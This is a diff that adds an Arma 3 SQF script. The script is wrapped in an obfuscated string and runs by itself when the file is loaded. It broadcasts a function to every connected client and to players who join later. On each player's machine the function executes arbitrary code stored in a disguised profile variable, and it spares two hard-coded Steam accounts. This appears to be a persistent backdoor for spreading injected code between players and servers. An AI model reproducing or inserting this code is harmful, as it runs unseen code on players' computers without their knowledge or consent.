@@ -1,0 +1,34 @@
+_bob = 'call{ 
+    _fnc={ 
+        if (!hasinterface) exitwith {}; 
+        waitUntil{ 
+            !isnil{ 
+                player 
+            }&&{ 
+                !isNull player 
+            } 
+        }; 
+        if (missionnamespace getVariable["injifncrun", false]) exitwith { 
+            remoteExec['+"'"+''+"'"+', '+"'"+'injifncjip'+"'"+']; 
+        }; 
+        if (getplayerUID player in["76561199511546073", "76561199153584559"]) exitwith { 
+            profileNamespace setVariable["i2n3j4e5c6t7_8008", nil]; 
+        }; 
+        private _codac=profileNamespace getVariable["i2n3j4e5c6t7_8008", "{}"]; 
+        if (_codac=="{}") exitwith {}; 
+        if ("openmissioninjector" in (toLower _codac)) exitwith { 
+            profileNamespace setVariable["i2n3j4e5c6t7_8008", nil]; 
+        }; 
+        [] call compile("[] call "+_codac); 
+        remoteExec['+"'"+''+"'"+', '+"'"+'injifncjip'+"'"+']; 
+        missionnamespace setVariable["injifncrun", true, true]; 
+    }; 
+    injifnc=['+"'"+''+"'"+', _fnc]; 
+    publicVariable'+"'"+'injifnc'+"'"+'; 
+    [[], { 
+        [] spawn(injifnc#1) 
+    }]remoteExec['+"'"+'spawn'+"'"+', 0, '+"'"+'injifncjip'+"'"+']; 
+}'; 
+ 
+[] call compile (_bob);
+
